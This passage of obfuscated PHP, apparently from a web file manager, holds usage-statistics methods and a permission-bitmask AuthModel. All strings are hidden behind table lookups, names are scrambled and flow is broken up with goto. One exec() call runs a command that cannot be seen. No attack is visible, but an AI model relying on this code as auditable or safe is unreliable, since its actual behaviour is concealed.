dateList($F²ƒÉ’îí•) { $F®¹ø¸ÔÕ† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F‡²¦É×² = $F²ƒÉ’îí•; $F¤ÃğĞ‡ = strtotime($F®¹ø¸ÔÕ†[1585]); $f£¿´‡ä» = array(); while ($F‡²¦É×² <= $F¤ÃğĞ‡) { $f£¿´‡ä»[] = date($F®¹ø¸ÔÕ†[1584], $F‡²¦É×²); $F‡²¦É×² = strtotime($F®¹ø¸ÔÕ†[1587], $F‡²¦É×²); } return $f£¿´‡ä»; } public function _recordUser($e°‡æÅÙ¯¦ = '') { goto F½Øì×ˆšˆ; b¸Ó·˜½—Â: $A¤äĞˆ­ÈÃ = Model($A•ëÂ®ÏÕ‘[510])->where($D¤¡¬«ÈÁê)->count($A•ëÂ®ÏÕ‘[1487]); $D¤¡¬«ÈÁê[$A•ëÂ®ÏÕ‘[29]] = $A•ëÂ®ÏÕ‘[1590]; $fÓÒ»„›ÑÜ = Model($A•ëÂ®ÏÕ‘[1591])->where($D¤¡¬«ÈÁê)->count($A•ëÂ®ÏÕ‘[1592]); goto cšàœÖÁ–; E¸Î¼§Ò‘¿: $D¤¡¬«ÈÁê = array($A•ëÂ®ÏÕ‘[202] => array($A•ëÂ®ÏÕ‘[931], $AÕäšè½ˆ×)); $b¬„åƒáæ = Model($A•ëÂ®ÏÕ‘[510])->where($D¤¡¬«ÈÁê)->count($A•ëÂ®ÏÕ‘[1487]); $D¤¡¬«ÈÁê[$A•ëÂ®ÏÕ‘[202]] = array($A•ëÂ®ÏÕ‘[338], array($BÙ¥Ì«Ë¸ù, $AÕäšè½ˆ×)); goto b¸Ó·˜½—Â; cšàœÖÁ–: $eÏËùÎˆ¥– = array($A•ëÂ®ÏÕ‘[230] => $e°‡æÅÙ¯¦, $A•ëÂ®ÏÕ‘[705] => (int) $b¬„åƒáæ, $A•ëÂ®ÏÕ‘[1577] => (int) $A¤äĞˆ­ÈÃ, $A•ëÂ®ÏÕ‘[1578] => (int) $fÓÒ»„›ÑÜ); return $this->insert($eÏËùÎˆ¥–); goto D±Ú¢ÆïŒ±; F½Øì×ˆšˆ: $A•ëÂ®ÏÕ‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÙ¥Ì«Ë¸ù = strtotime(date($A•ëÂ®ÏÕ‘[1588], strtotime($e°‡æÅÙ¯¦))); $AÕäšè½ˆ× = strtotime(date($A•ëÂ®ÏÕ‘[1589], strtotime($e°‡æÅÙ¯¦))); goto E¸Î¼§Ò‘¿; D±Ú¢ÆïŒ±: } public function _recordStore($D¥î´›æ’® = '') { goto E‚Í±¨ÚØ; BäŸôö…: $AŒÆâéİÑó[$Aè¨öÆ‚“[407]] = 1; $D–èŒ«²ğ = Model($Aè¨öÆ‚“[759])->where($AŒÆâéİÑó)->sum($Aè¨öÆ‚“[87]); $AŒÆâéİÑó[$Aè¨öÆ‚“[407]] = 2; goto CÆÄ’ê·ƒ; E£ÙË‚ë§Ï: $aÚ–†œÄâ = Model($Aè¨öÆ‚“[453])->where($AŒÆâéİÑó)->sum($Aè¨öÆ‚“[87]); $AŒÆâéİÑó[$Aè¨öÆ‚“[406]] = 0; $Bœš¡§¸â¦ = Model($Aè¨öÆ‚“[759])->where($AŒÆâéİÑó)->sum($Aè¨öÆ‚“[87]); goto BäŸôö…; E‚Í±¨ÚØ: $Aè¨öÆ‚“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F‹”ï±«À¥ = strtotime(date($Aè¨öÆ‚“[1589], strtotime($D¥î´›æ’®))); $AŒÆâéİÑó = array($Aè¨öÆ‚“[202] => array($Aè¨öÆ‚“[931], $F‹”ï±«À¥)); goto E£ÙË‚ë§Ï; CÆÄ’ê·ƒ: $dÒµĞî‘Éİ = Model($Aè¨öÆ‚“[759])->where($AŒÆâéİÑó)->sum($Aè¨öÆ‚“[87]); $A¯ŒÈìğÀÏ = array($Aè¨öÆ‚“[230] => $D¥î´›æ’®, $Aè¨öÆ‚“[703] => (int) $Bœš¡§¸â¦, $Aè¨öÆ‚“[1581] => (int) $aÚ–†œÄâ, $Aè¨öÆ‚“[1582] => (int) $D–èŒ«²ğ, $Aè¨öÆ‚“[1583] => (int) $dÒµĞî‘Éİ); return $this->insert($A¯ŒÈìğÀÏ); goto fíÛ±¿õèŒ; fíÛ±¿õèŒ: } public function trend($D—ØÒ­ºì, $B²¼³òÁšÓ) { goto e³äôÆ§ÔÜ; BÖšÓù¶‚: if ($bô‰šˆß¯ && $B²¼³òÁšÓ != $b—õæÑé„ö[1461]) { $dŞ§Å™å¹ø = $bô‰šˆß¯[0][$b—õæÑé„ö[230]]; $c•‘Á¤¦Á  = $this->validDate($B²¼³òÁšÓ, $dŞ§Å™å¹ø); $fšÔò¯çó = array(); $f¡ÏÊ¹°”™ = array_to_keyvalue($bô‰šˆß¯, $b—õæÑé„ö[230]); foreach ($c•‘Á¤¦Á  as $b«ª·å°ƒ) { if (isset($f¡ÏÊ¹°”™[$b«ª·å°ƒ])) { $cµ›Ë¥ŞÉö = $f¡ÏÊ¹°”™[$b«ª·å°ƒ]; } else { $cµ›Ë¥ŞÉö = end($bô‰šˆß¯); $cµ›Ë¥ŞÉö[$b—õæÑé„ö[230]] = $b«ª·å°ƒ; if ($D—ØÒ­ºì == $b—õæÑé„ö[566]) { $cµ›Ë¥ŞÉö[$b—õæÑé„ö[1577]] = $cµ›Ë¥ŞÉö[$b—õæÑé„ö[1578]] = 0; } } $fšÔò¯çó[] = $cµ›Ë¥ŞÉö; } $bô‰šˆß¯ = $fšÔò¯çó; } $fÎ…º„±™’ = array($b—õæÑé„ö[566] => array($b—õæÑé„ö[705] => LNG($b—õæÑé„ö[1593]), $b—õæÑé„ö[1577] => LNG($b—õæÑé„ö[1594]), $b—õæÑé„ö[1578] => LNG($b—õæÑé„ö[1595])), $b—õæÑé„ö[1579] => array($b—õæÑé„ö[703] => LNG($b—õæÑé„ö[1596]), $b—õæÑé„ö[1581] => LNG($b—õæÑé„ö[1597]), $b—õæÑé„ö[1582] => LNG($b—õæÑé„ö[1598]), $b—õæÑé„ö[1583] => LNG($b—õæÑé„ö[1599]))); $b£¢¡œø¯â = array($b—õæÑé„ö[566] => $b—õæÑé„ö[1600], $b—õæÑé„ö[1579] => $b—õæÑé„ö[87]); goto CİÂ§Ö‡ç‡; AøèÖá†±: return $eŞ¥ñåøÇÉ; goto eœÃˆÒ’£; e³äôÆ§ÔÜ: $b—õæÑé„ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->init($D—ØÒ­ºì)) { return !1; } $bô‰šˆß¯ = $this->trendList($D—ØÒ­ºì); goto BÖšÓù¶‚; CİÂ§Ö‡ç‡: if (empty($bô‰šˆß¯)) { $b«ª·å°ƒ = date($b—õæÑé„ö[1584], strtotime($b—õæÑé„ö[1585])); $cçßÁ­Í– = array($b—õæÑé„ö[230] => $b«ª·å°ƒ); foreach ($fÎ…º„±™’[$D—ØÒ­ºì] as $Dòİ‹ˆ°À => $aßÕå…ƒÂÇ) { $cçßÁ­Í–[$Dòİ‹ˆ°À] = 0; } $bô‰šˆß¯[] = $cçßÁ­Í–; } $eŞ¥ñåøÇÉ = array(); foreach ($bô‰šˆß¯ as $aßÕå…ƒÂÇ) { if ($D—ØÒ­ºì == $b—õæÑé„ö[1579] && $aßÕå…ƒÂÇ[$b—õæÑé„ö[1581]] > $aßÕå…ƒÂÇ[$b—õæÑé„ö[703]]) { $aßÕå…ƒÂÇ[$b—õæÑé„ö[1581]] = $aßÕå…ƒÂÇ[$b—õæÑé„ö[703]]; } foreach ($fÎ…º„±™’[$D—ØÒ­ºì] as $Dòİ‹ˆ°À => $bÒŸæôŞäá) { $cµ›Ë¥ŞÉö = array($b—õæÑé„ö[230] => $aßÕå…ƒÂÇ[$b—õæÑé„ö[230]], $b—õæÑé„ö[1393] => $bÒŸæôŞäá); $cµ›Ë¥ŞÉö[$b£¢¡œø¯â[$D—ØÒ­ºì]] = isset($aßÕå…ƒÂÇ[$Dòİ‹ˆ°À]) ? $aßÕå…ƒÂÇ[$Dòİ‹ˆ°À] : 0; $eŞ¥ñåøÇÉ[] = $cµ›Ë¥ŞÉö; } } goto AøèÖá†±; eœÃˆÒ’£: } public function validDate($b‘»ØÛ‚÷ˆ, $F„ØğóÕÀç) { goto f³³¸Ğåºä; eš Û†ãÕµ: switch ($b‘»ØÛ‚÷ˆ) { case $bµßÜéŒğ[1468]: $f¤ùª†Œ­Ÿ = mktime(0, 0, 0, date($bµßÜéŒğ[1601]), date($bµßÜéŒğ[1212]) - date($bµßÜéŒğ[1274]) + 7 - 7, date($bµßÜéŒğ[1602])); $E¢İ¦´õ‚ = 0; do { $FØàÈÍøÛÅ = date($bµßÜéŒğ[1584], $f¤ùª†Œ­Ÿ - 3600 * 24 * 7 * $E¢İ¦´õ‚); $a¬¯ß»‰©É[] = $FØàÈÍøÛÅ; $E¢İ¦´õ‚++; } while ($F„ØğóÕÀç < $FØàÈÍøÛÅ); break; case $bµßÜéŒğ[1466]: $E¢İ¦´õ‚ = 1; do { $EËõŸ¢Ùã = date($bµßÜéŒğ[1603], strtotime("\x2d\40{$E¢İ¦´õ‚}\x20\155\157\156\x74\150\x73")); $a¬¯ß»‰©É[] = $EËõŸ¢Ùã; $E¢İ¦´õ‚++; } while ($F„ØğóÕÀç < $EËõŸ¢Ùã); break; case $bµßÜéŒğ[1604]: $e—ÇÔ¢‹Î = (int) date($bµßÜéŒğ[1602], strtotime($F„ØğóÕÀç)); $D¡ùô¦é¼á = (int) date($bµßÜéŒğ[1602]); if ($e—ÇÔ¢‹Î >= $D¡ùô¦é¼á) { break; } for ($e—ÇÔ¢‹Î; $e—ÇÔ¢‹Î < $D¡ùô¦é¼á; $e—ÇÔ¢‹Î++) { $a¬¯ß»‰©É[] = $e—ÇÔ¢‹Î . $bµßÜéŒğ[1605]; } break; default: break; } if ($F„ØğóÕÀç > end($a¬¯ß»‰©É)) { array_pop($a¬¯ß»‰©É); } sort($a¬¯ß»‰©É); goto cÊƒŸæğè¥; cÊƒŸæğè¥: return $a¬¯ß»‰©É; goto dƒÜÌ¸¦¶³; f³³¸Ğåºä: $bµßÜéŒğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bäŞôïçøô = date($bµßÜéŒğ[1584], strtotime($bµßÜéŒğ[1585])); $a¬¯ß»‰©É = array($bäŞôïçøô); goto eš Û†ãÕµ; dƒÜÌ¸¦¶³: } public function listTable($FíïÛÌÚ©Í) { $aÔ”Æ‰ãÜ = ucfirst($FíïÛÌÚ©Í); return Model($aÔ”Æ‰ãÜ)->listData(); } public function option($fÀø •õá) { $a…êÅö¦õæ = $_SERVER[í¤âËÚ£¶íÊ¢][1606] . ucfirst($fÀø •õá); return $this->{$a…êÅö¦õæ}(); } private function optionUser() { goto b¿õçÄë„; AñÚ¦ŠŸ‡: $fæäÔÈŠ‰ = intval($GLOBALS[$A”¼·‡ˆá[6]][$A”¼·‡ˆá[354]][$A”¼·‡ˆá[1447]]) / 3600; $fÔËÆ¿˜·” = strtotime("\55{$fæäÔÈŠ‰}\x20\x68\157\165\x72\163"); $e—é‘²Ğç» = strtotime(date($A”¼·‡ˆá[1588])); goto e‘éä¶ñ²˜; e‘éä¶ñ²˜: if ($fÔËÆ¿˜·” < $e—é‘²Ğç») { $fÔËÆ¿˜·” = $e—é‘²Ğç»; } $C±–ÔÚ›É = array($A”¼·‡ˆá[1608] => array($A”¼·‡ˆá[932], $fÔËÆ¿˜·”)); $c‡ˆÔŠò•ò = (int) Model($A”¼·‡ˆá[510])->where($C±–ÔÚ›É)->count($A”¼·‡ˆá[1487]); goto B¾Œ¤¾­ó×; f«…œÂÎÃ¶: return array($A”¼·‡ˆá[700] => (int) $cÃÀÌÌµÎ§, $A”¼·‡ˆá[1609] => (int) ($cÃÀÌÌµÎ§ - $f…­ÆŠ³ Â), $A”¼·‡ˆá[1610] => (int) $f…­ÆŠ³ Â, $A”¼·‡ˆá[1611] => (int) $fáÌçá£İî, $A”¼·‡ˆá[1612] => $c‡ˆÔŠò•ò); goto A‹„íµ¹ƒÍ; b¿õçÄë„: $A”¼·‡ˆá =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÃÀÌÌµÎ§ = Model($A”¼·‡ˆá[510])->count($A”¼·‡ˆá[1487]); $f…­ÆŠ³ Â = Model($A”¼·‡ˆá[510])->where($A”¼·‡ˆá[1607])->count($A”¼·‡ˆá[1487]); goto AñÚ¦ŠŸ‡; B¾Œ¤¾­ó×: if (!$c‡ˆÔŠò•ò) { $c‡ˆÔŠò•ò = 1; } $C±–ÔÚ›É = array($A”¼·‡ˆá[1608] => array($A”¼·‡ˆá[932], $e—é‘²Ğç»)); $fáÌçá£İî = Model($A”¼·‡ˆá[510])->where($C±–ÔÚ›É)->count($A”¼·‡ˆá[1487]); goto f«…œÂÎÃ¶; A‹„íµ¹ƒÍ: } private function optionFile() { goto fó†‘÷×ß…; f±Üƒ¬ßœ: $CÓ»®®¾˜İ = $a‰ç›áÍ‹[$Dó¢ Ï©Ö[1581]]; $CØ§—½„ó = Model($Dó¢ Ï©Ö[759])->where(array($Dó¢ Ï©Ö[406] => 0))->count($Dó¢ Ï©Ö[399]); $F‰¡­×‰Ïª = array($Dó¢ Ï©Ö[406] => 0, $Dó¢ Ï©Ö[202] => array($Dó¢ Ï©Ö[932], strtotime(date($Dó¢ Ï©Ö[1588])))); goto bÖÈä¨Ç°ğ; bÖÈä¨Ç°ğ: $A²Ì·¼¼î = Model($Dó¢ Ï©Ö[759])->where($F‰¡­×‰Ïª)->sum($Dó¢ Ï©Ö[87]); $DõÏ¬†²¥â = Model($Dó¢ Ï©Ö[759])->where($F‰¡­×‰Ïª)->count($Dó¢ Ï©Ö[399]); return array($Dó¢ Ï©Ö[703] => $bÚÎÈŒÓÒ, $Dó¢ Ï©Ö[1581] => $CÓ»®®¾˜İ, $Dó¢ Ï©Ö[1613] => $bÚÎÈŒÓÒ - $CÓ»®®¾˜İ, $Dó¢ Ï©Ö[1614] => (int) $A²Ì·¼¼î, $Dó¢ Ï©Ö[705] => (int) $CØ§—½„ó, $Dó¢ Ï©Ö[1615] => (int) $DõÏ¬†²¥â); goto a”¸´ïˆ›„; fó†‘÷×ß…: $Dó¢ Ï©Ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a‰ç›áÍ‹ = $this->sourceSize(); $bÚÎÈŒÓÒ = $a‰ç›áÍ‹[$Dó¢ Ï©Ö[87]]; goto f±Üƒ¬ßœ; a”¸´ïˆ›„: } private function optionAccess() { $fç”«¸«×¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($fç”«¸«×¦[700] => $this->typeLogCnt(), $fç”«¸«×¦[116] => $this->typeLogCnt($fç”«¸«×¦[116]), $fç”«¸«×¦[433] => $this->typeLogCnt($fç”«¸«×¦[433]), $fç”«¸«×¦[1616] => $this->typeLogCnt($fç”«¸«×¦[1616]), $fç”«¸«×¦[1617] => $this->typeLogCnt($fç”«¸«×¦[1617]), $fç”«¸«×¦[566] => $this->typeLogCnt($fç”«¸«×¦[33], $fç”«¸«×¦[1592])); } private function typeLogCnt($e™Ùè‡»Ç = '', $FØ’Ğâ• = "\151\144") { goto aÏÂ®¸„ªƒ; EÄÈ…º ö¶: return (int) $dŠÄ–›ğÓÉ; goto cœ¿Ô„õ; aÏÂ®¸„ªƒ: $aé²ßÙ°à =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eˆÁßÒ—öŒ = array($aé²ßÙ°à[116] => array($aé²ßÙ°à[1618], $aé²ßÙ°à[1619]), $aé²ßÙ°à[433] => array($aé²ßÙ°à[1620], $aé²ßÙ°à[1621]), $aé²ßÙ°à[1616] => array($aé²ßÙ°à[1622], $aé²ßÙ°à[1623], $aé²ßÙ°à[1624]), $aé²ßÙ°à[1617] => array($aé²ßÙ°à[1625], $aé²ßÙ°à[1626]), $aé²ßÙ°à[1627] => array($aé²ßÙ°à[1628], $aé²ßÙ°à[1629], $aé²ßÙ°à[1630])); $BÛ®ËÄšÚä = strtotime(date($aé²ßÙ°à[1588])); goto BÁİ—¿Ê÷¤; BÁİ—¿Ê÷¤: $dŒóñ“­– = array($aé²ßÙ°à[202] => array($aé²ßÙ°à[932], $BÛ®ËÄšÚä)); if ($e™Ùè‡»Ç) { $dŒóñ“­–[$aé²ßÙ°à[29]] = array($aé²ßÙ°à[7], $eˆÁßÒ—öŒ[$e™Ùè‡»Ç]); } $dŠÄ–›ğÓÉ = Model($aé²ßÙ°à[1591])->where($dŒóñ“­–)->count($FØ’Ğâ•); goto EÄÈ…º ö¶; cœ¿Ô„õ: } private function optionServer() { goto E¿ÖÃ³ñ·œ; bëçòªòÛ: return array($AëØ¸£õŒ®[1633] => $dªºÇî Ô÷ ? $dªºÇî Ô÷[$AëØ¸£õŒ®[1634]] : 0, $AëØ¸£õŒ®[1635] => $dªºÇî Ô÷ ? $dªºÇî Ô÷[$AëØ¸£õŒ®[1636]] : 0, $AëØ¸£õŒ®[1637] => (int) $c ‡ÊìƒŸ[$AëØ¸£õŒ®[1634]] * 1024 * 1024 * 1024, $AëØ¸£õŒ®[1638] => (int) $eç‡Óùåì, $AëØ¸£õŒ®[1639] => ucfirst($eÔÃö­± ), $AëØ¸£õŒ®[1640] => $AëØ¸£õŒ®[1641] . PHP_VERSION, $AëØ¸£õŒ®[1642] => phpBuild64() ? 64 : 32, $AëØ¸£õŒ®[699] => str_replace($AëØ¸£õŒ®[1643], $AëØ¸£õŒ®[909], $FÄ˜âˆ‘Ê), $AëØ¸£õŒ®[354] => ucfirst($a’’¼¡ğ¼­), $AëØ¸£õŒ®[28] => $_SERVER[$AëØ¸£õŒ®[1644]]); goto aĞ¬Å˜×ñ†; E¿ÖÃ³ñ·œ: $AëØ¸£õŒ® =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dªºÇî Ô÷ = $this->diskDriver(); $c ‡ÊìƒŸ = KodIO::defaultDriver(); goto D­‰ÃÑÕ·ã; D­‰ÃÑÕ·ã: $f¥•ßî‹¹Î = array($AëØ¸£õŒ®[752] => $c ‡ÊìƒŸ[$AëØ¸£õŒ®[397]]); $eç‡Óùåì = Model($AëØ¸£õŒ®[453])->where($f¥•ßî‹¹Î)->sum($AëØ¸£õŒ®[87]); $Aô°é¹Ôäæ = explode($AëØ¸£õŒ®[50], $_SERVER[$AëØ¸£õŒ®[151]]); goto DÄ¹ìĞ½Ï”; Fç×¸¢—–: if ($FÄ˜âˆ‘Ê == $AëØ¸£õŒ®[730]) { $a†éÇç¡ª™ = explode($AëØ¸£õŒ®[1125], $FàË°‡‘ß[$AëØ¸£õŒ®[892]]); $FÄ˜âˆ‘Ê = $a†éÇç¡ª™[0]; } if ($FÄ˜âˆ‘Ê == $AëØ¸£õŒ®[733] || $FÄ˜âˆ‘Ê == $AëØ¸£õŒ®[734]) { $D‰£”Çº‰Ó = Model()->db()->query($AëØ¸£õŒ®[1631]); $B–İˆŠäÍË = $D‰£”Çº‰Ó[0] && isset($D‰£”Çº‰Ó[0][$AëØ¸£õŒ®[1392]]) ? $D‰£”Çº‰Ó[0][$AëØ¸£õŒ®[1392]] : 0; $FÄ˜âˆ‘Ê = $AëØ¸£õŒ®[1632] . ($B–İˆŠäÍË ? $AëØ¸£õŒ®[8] . $B–İˆŠäÍË : $AëØ¸£õŒ®[33]); } $a’’¼¡ğ¼­ = $GLOBALS[$AëØ¸£õŒ®[6]][$AëØ¸£õŒ®[354]][$AëØ¸£õŒ®[761]]; goto bëçòªòÛ; DÄ¹ìĞ½Ï”: $eÔÃö­±  = $Aô°é¹Ôäæ[0]; $FàË°‡‘ß = $GLOBALS[$AëØ¸£õŒ®[6]][$AëØ¸£õŒ®[17]]; $FÄ˜âˆ‘Ê = $FàË°‡‘ß[$AëØ¸£õŒ®[893]]; goto Fç×¸¢—–; aĞ¬Å˜×ñ†: } private function diskDriver() { goto a÷Æ³íµ»¾; A˜ÜÄéµñµ: $EèÓ¨Æá£¹ = $a¢É–§ôˆ‰ - @disk_free_space($aå†Â‰¢Œè); return array($DâÕ•ˆ²Òó[1634] => $a¢É–§ôˆ‰, $DâÕ•ˆ²Òó[1636] => $EèÓ¨Æá£¹); goto c®‰Ğ Ú¶; a÷Æ³íµ»¾: $DâÕ•ˆ²Òó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aå†Â‰¢Œè = $DâÕ•ˆ²Òó[8]; $eŠ²Æ–ôï = $GLOBALS[$DâÕ•ˆ²Òó[6]][$DâÕ•ˆ²Òó[1645]] == $DâÕ•ˆ²Òó[1646]; goto AÑšÔ™à™ ; AÑšÔ™à™ : if ($eŠ²Æ–ôï) { $aå†Â‰¢Œè = $DâÕ•ˆ²Òó[1647]; if (function_exists($DâÕ•ˆ²Òó[1648])) { exec($DâÕ•ˆ²Òó[1649], $bÜéÃÃ¢Á÷); $aå†Â‰¢Œè = $bÜéÃÃ¢Á÷[1] . $DâÕ•ˆ²Òó[8]; } } if (!file_exists($aå†Â‰¢Œè)) { return; } $a¢É–§ôˆ‰ = @disk_total_space($aå†Â‰¢Œè); goto A˜ÜÄéµñµ; c®‰Ğ Ú¶: } public function fileChart($e°Ú‘µ‚ÕÆ) { goto f‚ÚŸ†äè‚; f‚ÚŸ†äè‚: $Aìğö®¿Ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($e°Ú‘µ‚ÕÆ[$Aìğö®¿Ä[1487]])) { return Model($Aìğö®¿Ä[759])->userFileTypeProfile($e°Ú‘µ‚ÕÆ[$Aìğö®¿Ä[1487]]); } if (isset($e°Ú‘µ‚ÕÆ[$Aìğö®¿Ä[1650]])) { return Model($Aìğö®¿Ä[759])->groupFileTypeProfile($e°Ú‘µ‚ÕÆ[$Aìğö®¿Ä[1650]]); } goto EÆá‡‹ØÑÄ; AÔÉª˜ìØá: $fïäóµÙÔ[$Aìğö®¿Ä[407]] = 2; $FÎ†äÑµ  = Model($Aìğö®¿Ä[759])->where($fïäóµÙÔ)->sum($Aìğö®¿Ä[87]); return array($Aìğö®¿Ä[703] => $a’Äóê“ã­[$Aìğö®¿Ä[87]], $Aìğö®¿Ä[1581] => $a’Äóê“ã­[$Aìğö®¿Ä[1581]], $Aìğö®¿Ä[1582] => (int) $E¢·¿Õ×“, $Aìğö®¿Ä[1583] => (int) $FÎ†äÑµ ); goto f°ÙÙö·İë; EÆá‡‹ØÑÄ: $a’Äóê“ã­ = $this->sourceSize(); $fïäóµÙÔ = array($Aìğö®¿Ä[481] => 0, $Aìğö®¿Ä[407] => 1); $E¢·¿Õ×“ = Model($Aìğö®¿Ä[759])->where($fïäóµÙÔ)->sum($Aìğö®¿Ä[87]); goto AÔÉª˜ìØá; f°ÙÙö·İë: } private function sourceSize() { $B¥ ö…³•– =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bƒö¸‘ˆŸõ = Model($B¥ ö…³•–[759])->where(array($B¥ ö…³•–[406] => 0))->sum($B¥ ö…³•–[87]); $d‰¡±µÍÙ = Model($B¥ ö…³•–[453])->sum($B¥ ö…³•–[87]); if ($d‰¡±µÍÙ > $bƒö¸‘ˆŸõ) { $d‰¡±µÍÙ = $bƒö¸‘ˆŸõ; } return array($B¥ ö…³•–[87] => (int) $bƒö¸‘ˆŸõ, $B¥ ö…³•–[1581] => (int) $d‰¡±µÍÙ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $d™»ÍÑß–Ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DìÃ¶Ş™¯ = array(array($d™»ÍÑß–Ğ[416] => LNG($d™»ÍÑß–Ğ[1651]), $d™»ÍÑß–Ğ[1652] => $d™»ÍÑß–Ğ[1653], $d™»ÍÑß–Ğ[1654] => 1, $d™»ÍÑß–Ğ[1655] => 1, $d™»ÍÑß–Ğ[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($d™»ÍÑß–Ğ[416] => LNG($d™»ÍÑß–Ğ[1657]), $d™»ÍÑß–Ğ[1652] => $d™»ÍÑß–Ğ[1658], $d™»ÍÑß–Ğ[1654] => 2, $d™»ÍÑß–Ğ[1655] => 1, $d™»ÍÑß–Ğ[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($d™»ÍÑß–Ğ[416] => LNG($d™»ÍÑß–Ğ[1659]), $d™»ÍÑß–Ğ[1652] => $d™»ÍÑß–Ğ[1660], $d™»ÍÑß–Ğ[1654] => 3, $d™»ÍÑß–Ğ[1655] => 1, $d™»ÍÑß–Ğ[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($d™»ÍÑß–Ğ[416] => LNG($d™»ÍÑß–Ğ[1661]), $d™»ÍÑß–Ğ[1652] => $d™»ÍÑß–Ğ[1662], $d™»ÍÑß–Ğ[1654] => 4, $d™»ÍÑß–Ğ[1655] => 1, $d™»ÍÑß–Ğ[1656] => self::AUTH_SHOW | self::AUTH_VIEW), array($d™»ÍÑß–Ğ[416] => LNG($d™»ÍÑß–Ğ[1663]), $d™»ÍÑß–Ğ[1652] => $d™»ÍÑß–Ğ[1664], $d™»ÍÑß–Ğ[1654] => 5, $d™»ÍÑß–Ğ[1655] => 1, $d™»ÍÑß–Ğ[1656] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($d™»ÍÑß–Ğ[416] => LNG($d™»ÍÑß–Ğ[1665]), $d™»ÍÑß–Ğ[1652] => $d™»ÍÑß–Ğ[1666], $d™»ÍÑß–Ğ[1654] => 6, $d™»ÍÑß–Ğ[1655] => 1, $d™»ÍÑß–Ğ[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($d™»ÍÑß–Ğ[416] => LNG($d™»ÍÑß–Ğ[1667]), $d™»ÍÑß–Ğ[1652] => $d™»ÍÑß–Ğ[1668], $d™»ÍÑß–Ğ[1654] => 7, $d™»ÍÑß–Ğ[1655] => 1, $d™»ÍÑß–Ğ[1656] => 0)); return $DìÃ¶Ş™¯; } public static function authCheck($D±‚ãØÑøê, $A„ä£°¼àì) { $D±‚ãØÑøê = intval($D±‚ãØÑøê); if ($GLOBALS[$_SERVER[í¤âËÚ£¶íÊ¢][488]]) { return !0; } if ($D±‚ãØÑøê <= 0) { return !1; } if (($D±‚ãØÑøê & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($D±‚ãØÑøê & $A„ä£°¼àì); } public static function authCheckShow($cÆòöÍöÆƒ) { return self::authCheck($cÆòöÍöÆƒ, self::AUTH_SHOW); } public static function authCheckView($BğÍ­Å°‚Ô) { return self::authCheck($BğÍ­Å°‚Ô, self::AUTH_VIEW); } public static function authCheckDownload($DÎ—µŸ‰ÕÓ) { return self::authCheck($DÎ—µŸ‰ÕÓ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($báÁÙ¦¸ùÃ) { return self::authCheck($báÁÙ¦¸ùÃ, self::AUTH_UPLOAD); } public static function authCheckEdit($C±ùâëô´‰) { return self::authCheck($C±ùâëô´‰, self::AUTH_EDIT); } public static function authCheckRemove($D†ï¸´³õ ) { return self::authCheck($D†ï¸´³õ , self::AUTH_REMOVE); } public static function authCheckShare($Bæ¸îé´œâ) { return self::authCheck($Bæ¸îé´œâ, self::AUTH_SHARE); } public static function authCheckComment($BªÇ›½ãÅÖ) { return self::authCheck($BªÇ›½ãÅÖ, self::AUTH_COMMENT); } public static function authCheckEvent($D¦Æ½¶‚°) { return self::authCheck($D¦Æ½¶‚°, self::AUTH_EVENT); } public static function authCheckRoot($Dù—Ò¦š¢â) { return self::authCheck($Dù—Ò¦š¢â, self::AUTH_ROOT); } public static function authCheckAction($aÅ†ù…ÃÂï, $a†³Ó¥¸Ï£) { goto Aœ‰¬ê¡Ï; Aõ³Æù¶Šö: if (($aÅ†ù…ÃÂï & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aÅ†ù…ÃÂï & $C‹À¸ä‚Ê¸); goto Eì…áêäÒÜ; Aœ‰¬ê¡Ï: $E°„ß†ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BËáÒà±‡¿ = array($E°„ß†ˆ[1669] => self::AUTH_VIEW, $E°„ß†ˆ[1054] => self::AUTH_DOWNLOAD, $E°„ß†ˆ[116] => self::AUTH_UPLOAD, $E°„ß†ˆ[1617] => self::AUTH_EDIT, $E°„ß†ˆ[1616] => self::AUTH_REMOVE, $E°„ß†ˆ[1627] => self::AUTH_SHARE, $E°„ß†ˆ[359] => self::AUTH_COMMENT, $E°„ß†ˆ[1476] => self::AUTH_EVENT, $E°„ß†ˆ[1670] => 